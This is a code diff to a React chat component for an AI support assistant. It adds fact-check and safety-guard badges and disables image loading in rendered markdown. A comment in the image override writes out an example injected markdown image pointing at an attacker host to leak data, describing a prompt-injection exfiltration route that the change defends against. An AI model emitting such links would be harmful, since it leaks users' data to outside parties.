@@ -2,7 +2,7 @@
 
 import ReactMarkdown from "react-markdown";
 import remarkGfm from "remark-gfm";
-import { Activity, CheckCircle2, Headset, Info, Loader2, TriangleAlert } from "lucide-react";
+import { Activity, CheckCircle2, Headset, Info, Loader2, ShieldCheck, TriangleAlert } from "lucide-react";
 
 import { SentFileChips } from "@/components/attachments";
 import type { AttachmentMeta, Citation } from "@/lib/types";
@@ -10,7 +10,15 @@ import { cn } from "@/lib/utils";
 
 export type UiMessage =
   | { kind: "customer"; text: string; attachments?: AttachmentMeta[] }
-  | { kind: "ai"; text: string; citations: Citation[]; status?: string; streaming?: boolean }
+  | {
+      kind: "ai";
+      text: string;
+      citations: Citation[];
+      status?: string;
+      streaming?: boolean;
+      check?: { verdict: string; claims?: number; supported?: number; unsupported?: string[] };
+      guarded?: string[];
+    }
   | { kind: "staff"; text: string; id: number }
   | { kind: "notice"; text: string; tone: "info" | "success" | "warning" }
   | { kind: "known_issue"; number: string; notice: string };
@@ -42,6 +50,13 @@ export function Markdown({ text }: { text: string }) {
       <ReactMarkdown
         remarkPlugins={[remarkGfm]}
         components={{
+          // never load images: an injected ![x](https://attacker/?d=...) would send data when it loads
+          img: ({ src, alt }) => (
+            <a href={typeof src === "string" ? src : undefined} target="_blank" rel="noreferrer nofollow"
+               className="text-xs text-muted-foreground underline">
+              [image{alt ? `: ${alt}` : ""}]
+            </a>
+          ),
           a: ({ href, title, children }) => (
             <a
               href={href}
@@ -145,6 +160,7 @@ export function ChatMessage({ message }: { message: UiMessage }) {
             </div>
           )
         )}
+        {!message.streaming && <TrustNote check={message.check} guarded={message.guarded} />}
         {!message.streaming && sources.length > 0 && (
           <div className="flex flex-wrap gap-1.5 pt-0.5">
             {sources.map((c) => (
@@ -164,4 +180,32 @@ export function ChatMessage({ message }: { message: UiMessage }) {
       </div>
     </div>
   );
+}
+
+/** Result of the self-check and the output guard, under an assistant answer. */
+function TrustNote({ check, guarded }: { check?: Extract<UiMessage, { kind: "ai" }>["check"]; guarded?: string[] }) {
+  if (guarded?.length)
+    return (
+      <p className="flex items-center gap-1 text-[11px] text-amber-700 dark:text-amber-400">
+        <ShieldCheck className="size-3" /> Part of this answer was removed by a safety check.
+      </p>
+    );
+  if (check?.verdict === "grounded")
+    return (
+      <p className="flex items-center gap-1 text-[11px] text-emerald-700 dark:text-emerald-400"
+         title={`${check.supported} of ${check.claims} statements found in the cited documentation`}>
+        <ShieldCheck className="size-3" /> Checked against the docs
+      </p>
+    );
+  if (check?.verdict === "revised") {
+    const n = check.unsupported?.length ?? 0;
+    return (
+      <p className="flex items-center gap-1 text-[11px] text-amber-700 dark:text-amber-400"
+         title={check.unsupported?.join("\n")}>
+        <ShieldCheck className="size-3" /> Revised after fact-check: removed {n} statement{n === 1 ? "" : "s"} the docs
+        don&apos;t support
+      </p>
+    );
+  }
+  return null;
 }
